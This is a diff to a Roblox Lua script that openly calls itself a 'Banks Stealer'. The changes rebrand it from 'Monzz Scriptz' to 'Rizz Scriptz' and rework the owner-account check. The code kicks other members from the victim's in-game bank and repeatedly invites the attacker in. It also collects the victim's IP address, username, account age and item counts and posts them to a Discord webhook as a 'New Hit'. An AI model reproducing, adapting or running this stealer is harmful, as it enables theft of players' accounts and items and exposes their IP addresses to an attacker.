@@ -73,20 +73,23 @@ getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 local url = Webhook
-if UserName == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A Username")
-    return;
-end
-local worked = pcall(function()
-    game:GetService("Players"):GetNameFromUserIdAsync(UserName)
-end)
-if not worked then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username")
-    return;
-end
-local UserName = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
 if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if dhuser ~= nil then
     local test = pcall(function()
@@ -523,7 +526,7 @@ local tier4gems = 1500000000000 - gemsinbank
 -- Kicking The Players
 
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= UserName then
+    if v ~= _G.UserID then
         kickremote:InvokeServer(Bank, v)
     end
 end
@@ -535,7 +538,7 @@ if tier ~= 1 then
         inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
     end
     task.wait()
-    inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
 -- Bank Pets
 Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
@@ -1209,7 +1212,7 @@ end
 
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
-local receiver = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
+local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
 local lmao = "/5"
@@ -1222,15 +1225,15 @@ end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif"
+    imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
 
     data1 = {
         ["content"] = ping,
-        ["username"] = "Monzz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif",
+        ["username"] = "Rizz Scriptz",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||Monzz Scriptz||",
-            ["url"] = "https://discord.gg/4y4CZfdJHu",
+            ["title"] = "**New Hit** ||With Rizz||",
+            ["url"] = "https://discord.gg/uSgzNwHDTS",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
@@ -1239,7 +1242,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**Monzz Scriptz's Banks Stealer** :skull:",
+                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
@@ -1250,7 +1253,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. DiamondsCount .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":frog: **Pets** :forg:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                 ["inline"] = true
             }, {
@@ -1290,7 +1293,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets** :frog:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1344,7 +1347,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets** :frog:",
+                ["name"] = ":dog: **Pets** :dog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
@@ -1380,7 +1383,7 @@ if dhwebhook ~= nil then
     request(abcdef2)
 end
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= UserName then
+    if v ~= _G.UserID then
         kickremote:InvokeServer(Bank, v)
     end
 end
@@ -1389,5 +1392,5 @@ while task.wait(0.1) do
         inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
     end
     task.wait()
-    inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
